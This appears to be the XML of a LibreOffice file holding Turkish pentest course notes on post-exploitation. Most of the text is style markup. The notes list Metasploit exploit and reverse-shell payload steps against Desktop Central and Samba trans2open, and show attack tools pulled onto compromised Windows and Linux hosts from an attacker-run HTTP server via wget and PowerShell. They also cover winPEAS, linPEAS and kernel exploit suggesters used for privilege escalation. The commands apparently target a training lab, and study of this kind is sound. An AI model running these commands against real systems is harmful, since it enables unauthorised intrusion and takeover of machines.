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paragraph-rsid="001a4133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224b12" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="003ee919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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="002cff6a" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00409163" officeooo:paragraph-rsid="00409163" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00417afd" officeooo:paragraph-rsid="00417af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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0042c810" officeooo:paragraph-rsid="0042c810" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004555e6" officeooo:paragraph-rsid="004555e6" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="003ee919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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004555e6" officeooo:paragraph-rsid="004555e6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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0042c810" officeooo:paragraph-rsid="0042c810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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00436a91" officeooo:paragraph-rsid="00436a91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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004555e6" officeooo:paragraph-rsid="004555e6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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004555e6" officeooo:paragraph-rsid="004555e6" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0047577c" officeooo:paragraph-rsid="0047577c" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0042c810" officeooo:paragraph-rsid="0042c810" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0042c8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7. POST EXPLOTATION</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">Windows ta Local Exploit Tespiti</text:p>
      <text:p text:style-name="P4">msfconsole dan</text:p>
      <text:p text:style-name="P4">search desktop central yapıp.</text:p>
      <text:p text:style-name="P4">connectionid_write <text:s/>exploitini ayarlıyoruz.</text:p>
      <text:p text:style-name="P4">Payloadımızı <text:s/>windows/x64/meterpreter/reverse_tcp <text:s/>yapıyoruz.</text:p>
      <text:p text:style-name="P5">Meterpreter dayız</text:p>
      <text:p text:style-name="P5">shell</text:p>
      <text:p text:style-name="P5">cd <text:a xlink:type="simple" xlink:href="../../../../../c://" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c://</text:a></text:p>
      <text:p text:style-name="P5">systeminfo (çıkan bilgi çok kıymetli ve bunu vagrant.txt olarak kaydediyoruz.)</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">./wes.py /root/Desktop/vagrant.txt</text:p>
      <text:p text:style-name="P5">sistem açıklarını (CVE) <text:s/>buluyoruz.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P10">LINUX ta Local (Kernel) Exploit Tespiti</text:p>
      <text:p text:style-name="P6">msfconsole da trans2open aradık</text:p>
      <text:p text:style-name="P6">rhosts ve payload linux/x86/shell ayarladık</text:p>
      <text:p text:style-name="P6">shell e girince uname -a <text:s/>yazıp kernel bilgisini aldık</text:p>
      <text:p text:style-name="P6">./linux-exploit-suggester-2.pl -k 2.4.7 <text:s/>(kernel bilgisinden CVE bulduk.)</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P11">LINUX a Dosya Çekerek Kernel Exploit Tespiti</text:p>
      <text:p text:style-name="P7">cd opt/linux-exploit-suggester-2/</text:p>
      <text:p text:style-name="P7">buraya giderek komutumuzu çalıştıracağız.</text:p>
      <text:p text:style-name="P7">python -m http.server <text:s/>(şuan http serverız)</text:p>
      <text:p text:style-name="P7">girdiğimiz shell de </text:p>
      <text:p text:style-name="P7">cd /tmp</text:p>
      <text:p text:style-name="P7">wget <text:a xlink:type="simple" xlink:href="http://10.10.10.80:8000/linux-exploit-suggester-2.pl" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.80:8000/linux-exploit-suggester-2.pl</text:a> <text:s text:c="2"/>(taşıdık)</text:p>
      <text:p text:style-name="P7">chmod +x linux-exploit-suggester-2.pl <text:s text:c="5"/>(çalışma yetkisi verdik)</text:p>
      <text:p text:style-name="P7">./linux-exploit-suggester-2.pl <text:s text:c="2"/>(hedefte çalıştırdık)</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P12">Metasploit te Çoklu Oturum Yönetimi</text:p>
      <text:p text:style-name="P7">msf console, desktop central 9 <text:s/>a giriyoruz</text:p>
      <text:p text:style-name="P7">ayarlıyoruz. Run..</text:p>
      <text:p text:style-name="P7">açılan meterpreter ı bg ile arkaya atıyoruz</text:p>
      <text:p text:style-name="P7">açılmazsa ctrl + c ile bitirip sessions tan kontrol ediyoruz</text:p>
      <text:p text:style-name="P7">sessions -k diyerek id sini verdiğimiz bg öldürürüz.</text:p>
      <text:p text:style-name="P7">Search trans2open linuxu seçiyoruz</text:p>
      <text:p text:style-name="P7">payloadımızı <text:s text:c="2"/><text:span text:style-name="T1">linux/x86/shell</text:span>_reverse_tcp <text:s/>ayarladık.</text:p>
      <text:p text:style-name="P7">Run</text:p>
      <text:p text:style-name="P7">bg</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P9">Metasploit ile Local Exploit Tespiti</text:p>
      <text:p text:style-name="P7">search exploit_suggester</text:p>
      <text:p text:style-name="P7">set session 1</text:p>
      <text:p text:style-name="P7">run</text:p>
      <text:p text:style-name="P7">sessions değiştirdikçe o cihazın exploiti bulunu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Hedefte Local Enumeration (otomatik)</text:p>
      <text:p text:style-name="P14">Arkada windows (1) ve Linux (2) sessions larımızı açık.</text:p>
      <text:p text:style-name="P14">Desktop üzerinde http host olup dosya aktaracağız..</text:p>
      <text:p text:style-name="P14">python -m http.server</text:p>
      <text:p text:style-name="P14">Sessions 1</text:p>
      <text:p text:style-name="P14">shell</text:p>
      <text:p text:style-name="P14">powershell.exe -command IWR -Uri http://10.10.10.80:8000/winPEASx64.exe -OutFile %temp%\winPEASx64.exe</text:p>
      <text:p text:style-name="P14">cd %temp%</text:p>
      <text:p text:style-name="P6">winpeasx64.exe</text:p>
      <text:p text:style-name="P14">windows için local enum..</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">sessions 2</text:p>
      <text:p text:style-name="P14">wget http://10.10.10.80:8000/linpeas.sh</text:p>
      <text:p text:style-name="P14">chmod +x linpeas.sh</text:p>
      <text:p text:style-name="P14">./linpeas.sh</text:p>
      <text:p text:style-name="P14">linux için local enum.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5:34:57.473771278</meta:creation-date>
    <dc:date>2022-09-03T19:19:20.424200867</dc:date>
    <meta:editing-duration>PT11H18M30S</meta:editing-duration>
    <meta:editing-cycles>33</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="56" meta:word-count="225" meta:character-count="1893" meta:non-whitespace-character-count="1703"/>
  </office:meta>
</office:document-meta>
</file>